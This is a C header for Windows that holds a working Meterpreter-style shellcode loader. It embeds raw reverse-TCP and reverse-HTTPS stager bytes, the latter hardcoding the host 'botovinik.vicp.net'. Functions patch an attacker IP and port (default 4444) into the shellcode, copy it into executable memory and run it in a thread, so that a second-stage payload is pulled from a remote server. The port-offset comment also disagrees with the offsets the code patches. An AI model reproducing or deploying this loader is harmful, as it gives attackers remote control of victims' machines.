#ifndef LKYHEADFILEFORMETERPRETER
#define LKYHEADFILEFORMETERPRETER

#include "windows.h"
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#include "debug.h"

typedef struct metast
{
	char host[64];
	DWORD port, payload, option, reserve;
}METAST, *PMETAST;

#define  lentcp 19*15+5
#define  lenhttps 374

unsigned char https[] =
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
"\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
"\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x40\x1f\x00\x00\x53"
"\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
"\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
"\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
"\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
"\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
"\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x56\x4e"
"\x68\x50\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
"\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
"\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
"\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
"\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff\x62\x6f\x74\x6f\x76"
"\x69\x6e\x69\x6b\x2e\x76\x69\x63\x70\x2e\x6e\x65\x74\x00";

unsigned char tcp[] =
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
"\x05\x68"
"\xc0\xa8\x01\x01"		//IP offset 197
"\x68\x02\x00"
"\x11\x5c"		//port offset 202
"\x89\xe6\x6a\x10"
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";

unsigned long WINAPI resolve(char *host)
{
	long i = inet_addr(host);

	if (i < 0)
	{
		struct hostent *ser = (struct hostent*)gethostbyname(host);

		if (ser == NULL)
		{
			ser = (struct hostent*)gethostbyname(host); //retry
		}

		if (ser == NULL)
		{
			return 0;
		}

		i = (*(unsigned long *)ser->h_addr);
	}

	return i;
}

DWORD WINAPI prochost(LPVOID lp)
{
	__try
	{
		_asm
		{
			__emit 0x90	//0xcc
				//push Eax
				mov eax, lp
				jmp Eax
				//pop eax
		}
	}
	__except (1)
	{
		MsgErr("Catch");
	}

	return 0;
}

int WINAPI Meterproc(char hostofaddr[], short lport, int payload)
{
	HANDLE h;
	PVOID code;

	switch (payload)
	{
	case 1:	//tcp
		char phostaddr[128], *p;
		lstrcpy(phostaddr, hostofaddr);

		DWORD rt;
		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);

		rt = resolve(phostaddr);	//botovinik.vicp.net

		tcp[233] = tcp[234] = 0xcc;		//set error when exit

		code = VirtualAlloc(0, lentcp + 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(code, (PVOID)tcp, lentcp);
		p = (PCHAR)code;

		RtlCopyMemory((PVOID)&p[197], (PVOID)&rt, 4);	//addr
		p[204] = lport / 256;		//port
		p[205] = lport % 256;

		h = CreateThread(NULL, 0, prochost, (LPVOID)code, 0, &rt);

		WaitForSingleObject(h, INFINITE);

		CloseHandle(h);

		VirtualFree(code, lentcp + 10, MEM_RELEASE);
		WSACleanup();
		break;

	case 2:	//https
		code = VirtualAlloc(0, lenhttps + 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		RtlCopyMemory(code, (PVOID)https, lenhttps);

		h = CreateThread(NULL, 0, prochost, (LPVOID)code, 0, &rt);

		WaitForSingleObject(h, INFINITE);

		CloseHandle(h);

		VirtualFree(code, lenhttps + 10, MEM_RELEASE);

		break;

	default:
		break;
	}

	return 0;
}

inline int WINAPI Meterproc(char hostofaddr[], short lport)
{
	Meterproc(hostofaddr, lport, 1);	//use default payload
}

inline int WINAPI Meterproc(char phostaddr[])
{
	return Meterproc(phostaddr, 4444, 1);
}

int WINAPI Meterproc(PMETAST lp)
{
	return Meterproc(lp->host, (short)lp->port, lp->payload);
}

#endif
